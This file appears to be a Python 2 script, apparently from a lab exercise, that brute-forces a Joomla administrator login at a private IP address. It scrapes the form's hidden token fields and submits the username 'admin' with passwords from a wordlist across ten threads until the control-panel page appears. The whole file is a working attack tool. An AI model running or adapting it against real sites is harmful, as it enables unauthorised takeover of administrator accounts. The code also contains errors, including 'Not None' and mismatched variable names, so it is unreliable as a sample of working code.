import urllib2
import urllib
import cookielib
import threading
import sys
import Queue

from HTMLParser import HTMLParser

userThread = 10
userName = "admin"
wordListFile = "/tmp/cain.txt"
resume = None

targetUrl = "http://192.168.112.131/administrator/index.php"
targetPost = "http://192.168.112.131/administrator/index.php"

userNameField = "username"
passwordField = "passwd"

successCheck = "Administration - Control Panel"

class BruteParser(HTMLParser):
    
    def __init__(self):
        HTMLParser.__init__(self)
        self.tagResults = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tagName = None
            tagvalue= None

            for name, value in attrs:
                if name == "name":
                    tagName = value
                if name == "value":
                    tagValue = value

            if tagName is not None:
                self.tagResults[tagName] = tagValue

class Bruter(object):
    
    def __init__(self, userName, words):
        self.userName = userName
        self.password = words
        self.found = False

        print "Finished setting up for: %s" % userName
        
    def runBruteForce(self):
        for i in range(userThread):
            t = threading.Thread(target = self.webBruter)
            t.start()

    def webBruter(self):
        while not self.password.empty() and not self.found:
            brute = self.password.get().rstrip()
            jar = cookielib.FileCookieJar("cookies")
            opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(jar))
            
            response = opener.open(targetUrl)

            page = response.read()

            print "Trying: %s : %s (%d left)" % (self.userName, brute, self.password.qsize())
            
            parser = BruteParser()
            parser.feed(page)

            postTags = parser.tagResults
            postTags[userNameField] = self.userName
            postTags[passwordField] = brute

            loginData = urllib.urlencode(postTags)
            loginResponse = opener.open(targetPost, loginData)
            loginResult = loginResponse.read()

            if successCheck in loginResult:
                self.found = True
                
                print "[*] Bruteforce successful."
                print "[*] Username: %s" % userName
                print "[*] Password: %s" % brute
                print "[*] Waiting for other threads to exit..."

def buildWordList(worldListFile):
    fd = open(wordListFile, "rb")
    rawWords = fd.readlines()
    fd.close()

    foundResume = False
    words = Queue.Queue()

    for word in rawWords:
        word = word.rstrip()
        if resume is Not None:
            if foundResume:
                words.put(word)
            else:
                if word == resume:
                    foundResume = True
                    print "Resuming wordlist from: %s" % resume
        else:
            words.put(word)

    return words

words = buildWordList(wordListFile)

bruterObj = Bruter(userName, words)
bruterObj.runBruteForce()


